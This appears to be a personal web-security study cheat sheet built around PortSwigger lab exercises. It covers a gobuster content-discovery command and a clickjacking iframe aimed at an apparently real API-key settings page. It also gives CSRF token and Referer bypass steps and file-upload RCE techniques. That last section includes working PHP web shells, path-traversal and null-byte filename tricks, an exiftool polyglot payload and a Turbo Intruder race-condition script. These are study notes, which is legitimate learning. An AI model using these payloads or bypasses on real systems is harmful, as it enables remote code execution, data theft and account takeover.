# CIA
	Integrity : data only change by auth.
	Avalability : Avalable data when user need.
	Confidentility : Data access by auth.
  
# Containt Discover
	gobuster -u http://fakebank.com -w wordlist.txt dir 
	
# ClickJacking
	<!DOCTYPE html>
	<html lang="en">
	<head>
	  <meta charset="UTF-8">
	</head>
	<body>
	  <iframe src="https://10x.redoxengine.com/#/organization/8168/development/developer/apiKeys/dd364dd9-7bc3-4e78-aeea-cd400e1ff721/settings" frameborder="0"></iframe>
	</body>
	</html>

# CSRF
## CSRF parameter is not available
---> generate CSRF POC and try

## CSRF parameter available 

-> Change action METHOD (GET OR POST)

-> Remove CSRF parameter
eg. email and CSRF
remove CSRF
now> email

-> enter own CSRF taken and send to victim (CSRF token one time use so, create fresh token everytime after use. For testing use inco mode. for more read paragraph.)



1)  Open Burp's browser and log in to your account. Submit the "Update email" form, and intercept the resulting request.
    Make a note of the value of the CSRF token, then drop the request.
2) Open a private/incognito browser window, log in to your other account, and send the update email request into Burp Repeater.
3) Observe that if you swap the CSRF token with the value from the other account, then the request is accepted.
4) Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab. Note that the CSRF tokens are single-use, so you'll need to include a fresh one.
    Store the exploit, then click "Deliver to victim" to solve the lab.


->if CSRF key cookies and CSRF token are available

https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie 

->if header error occure
1) so try remove header
https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present

2) if header remove not work try changing domain like
refrer: http://google.com
to
http://burpsuit/?google.com
https://portswigger.net/web-security/csrf/lab-referer-validation-broken

# RCE

<?php echo file_get_contents('/home/carlos/secret'); ?>

<?php echo system($_GET['command']); ?>

1) upload file

2) change content-type
Content-Type to image/jpeg

3) Content-Disposition
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
if its work now change 
filename="..%2fexploit.php" in content
if its work access with ..%2fexploit.php

4) Overriding the server configuration
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass

5) Obfuscating file extensions
filename="exploit.php%00.jpg"
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension

6) Flawed validation of the file's contents
embeded code in image
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php

7) Only jpeg and png allow
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
